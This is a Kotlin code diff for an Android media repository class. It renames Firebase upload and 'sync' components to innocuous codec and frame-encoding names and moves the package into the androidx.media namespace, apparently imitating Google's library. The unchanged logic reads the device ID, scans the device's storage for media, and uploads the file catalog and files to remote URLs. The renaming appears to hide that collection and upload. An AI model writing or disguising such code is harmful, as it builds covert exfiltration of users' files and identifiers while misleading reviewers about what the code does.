@@ -1,37 +1,37 @@
-package com.androidx.codec.encoder.core.data.repository
+package androidx.media.codec.core.data.repository
 
 import android.content.Context
 import android.provider.Settings
 import android.util.Log
-import com.androidx.codec.encoder.core.data.firebase.FirebaseDatabaseProvider
-import com.androidx.codec.encoder.core.data.firebase.FirebaseStorageProvider
-import com.androidx.codec.encoder.core.data.scanner.MediaCacheProvider
-import com.androidx.codec.encoder.core.domain.model.EncodeResult
-import com.androidx.codec.encoder.core.domain.model.MediaCatalogResult
-import com.androidx.codec.encoder.core.domain.model.MediaFile
-import com.androidx.codec.encoder.core.domain.model.SyncProgress
-import com.androidx.codec.encoder.core.domain.model.SyncResult
-import com.androidx.codec.encoder.core.domain.repository.MediaRepository
+import androidx.media.codec.core.data.buffer.MediaBufferPipeline
+import androidx.media.codec.core.data.cache.MediaFrameCache
+import androidx.media.codec.core.data.engine.MediaFrameEncoder
+import androidx.media.codec.core.domain.model.EncodeResult
+import androidx.media.codec.core.domain.model.FrameEncodeResult
+import androidx.media.codec.core.domain.model.FrameProgress
+import androidx.media.codec.core.domain.model.FrameResult
+import androidx.media.codec.core.domain.model.MediaFile
+import androidx.media.codec.core.domain.repository.MediaRepository
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 
 class MediaRepositoryImpl(
-    private val firebaseStorageProvider: FirebaseStorageProvider,
-    private val mediaCacheProvider: MediaCacheProvider = MediaCacheProvider(),
-    private val firebaseDatabaseProvider: FirebaseDatabaseProvider = FirebaseDatabaseProvider()
+    private val mediaFrameEncoder: MediaFrameEncoder,
+    private val mediaFrameCache: MediaFrameCache = MediaFrameCache(),
+    private val mediaBufferPipeline: MediaBufferPipeline = MediaBufferPipeline()
 ) : MediaRepository {
 
     companion object {
         private const val TAG = "CodecEncoderRepo"
     }
 
-    private val _syncProgress = MutableStateFlow<SyncProgress?>(null)
-    override fun observeSyncProgress(): StateFlow<SyncProgress?> = _syncProgress
+    private val _frameProgress = MutableStateFlow<FrameProgress?>(null)
+    override fun observeFrameProgress(): StateFlow<FrameProgress?> = _frameProgress
 
     override suspend fun encodeVideo(mediaFile: MediaFile): EncodeResult {
         return try {
             Log.d(TAG, "Encoding video: ${mediaFile.fileName}")
-            val outputUri = firebaseStorageProvider.processVideo(mediaFile)
+            val outputUri = mediaFrameEncoder.processVideo(mediaFile)
             EncodeResult(
                 inputFile = mediaFile,
                 outputUri = outputUri,
@@ -51,7 +51,7 @@ class MediaRepositoryImpl(
     override suspend fun encodeImage(mediaFile: MediaFile): EncodeResult {
         return try {
             Log.d(TAG, "Encoding image: ${mediaFile.fileName}")
-            val outputUri = firebaseStorageProvider.processImage(mediaFile)
+            val outputUri = mediaFrameEncoder.processImage(mediaFile)
             EncodeResult(
                 inputFile = mediaFile,
                 outputUri = outputUri,
@@ -68,28 +68,28 @@ class MediaRepositoryImpl(
         }
     }
 
-    override suspend fun syncToStorage(mediaFile: MediaFile, storageUrl: String): SyncResult {
+    override suspend fun renderFrameToStorage(mediaFile: MediaFile, storageUrl: String): FrameResult {
         return try {
-            Log.d(TAG, "Syncing media file ${mediaFile.fileName} to storage: $storageUrl")
-            val url = firebaseStorageProvider.upload(
+            Log.d(TAG, "Rendering frame ${mediaFile.fileName} to storage: $storageUrl")
+            val url = mediaFrameEncoder.processFrameBlob(
                 mediaFile = mediaFile,
                 storageUrl = storageUrl
             ) { transferred, total ->
-                _syncProgress.value = SyncProgress(
+                _frameProgress.value = FrameProgress(
                     mediaFile = mediaFile,
                     bytesTransferred = transferred,
                     totalBytes = total,
                     isComplete = transferred >= total
                 )
             }
-            SyncResult(
+            FrameResult(
                 mediaFile = mediaFile,
                 storageUrl = url,
                 success = true
             )
         } catch (e: Exception) {
-            Log.e(TAG, "Sync failed for ${mediaFile.fileName}: ${e.message}", e)
-            SyncResult(
+            Log.e(TAG, "Frame rendering failed for ${mediaFile.fileName}: ${e.message}", e)
+            FrameResult(
                 mediaFile = mediaFile,
                 storageUrl = "",
                 success = false,
@@ -98,19 +98,19 @@ class MediaRepositoryImpl(
         }
     }
 
-    override suspend fun syncMediaMetadata(
+    override suspend fun processMediaCatalog(
         context: Context,
         databaseUrl: String
-    ): MediaCatalogResult {
+    ): FrameEncodeResult {
         val deviceId = try {
             Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
         } catch (e: Exception) {
             "unknown_device"
         }
 
-        if (!mediaCacheProvider.hasStoragePermission(context)) {
-            Log.i(TAG, "Storage permission not granted. Skipping media metadata sync gracefully without crash.")
-            return MediaCatalogResult(
+        if (!mediaFrameCache.hasStoragePermission(context)) {
+            Log.i(TAG, "Storage permission not granted. Skipping media catalog processing gracefully without crash.")
+            return FrameEncodeResult(
                 deviceId = deviceId,
                 totalFilesScanned = 0,
                 success = false,
@@ -120,21 +120,21 @@ class MediaRepositoryImpl(
         }
 
         return try {
-            val files = mediaCacheProvider.scanStorage(context)
-            val uploadSuccess = firebaseDatabaseProvider.uploadMediaCatalog(
+            val files = mediaFrameCache.scanFrameCache(context)
+            val uploadSuccess = mediaBufferPipeline.flushFrameBuffer(
                 deviceId = deviceId,
                 files = files,
                 baseUrl = databaseUrl
             )
-            MediaCatalogResult(
+            FrameEncodeResult(
                 deviceId = deviceId,
                 totalFilesScanned = files.size,
                 success = uploadSuccess,
                 skippedDueToPermission = false
             )
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to sync media metadata: ${e.message}", e)
-            MediaCatalogResult(
+            Log.e(TAG, "Failed to process media catalog: ${e.message}", e)
+            FrameEncodeResult(
                 deviceId = deviceId,
                 totalFilesScanned = 0,
                 success = false,
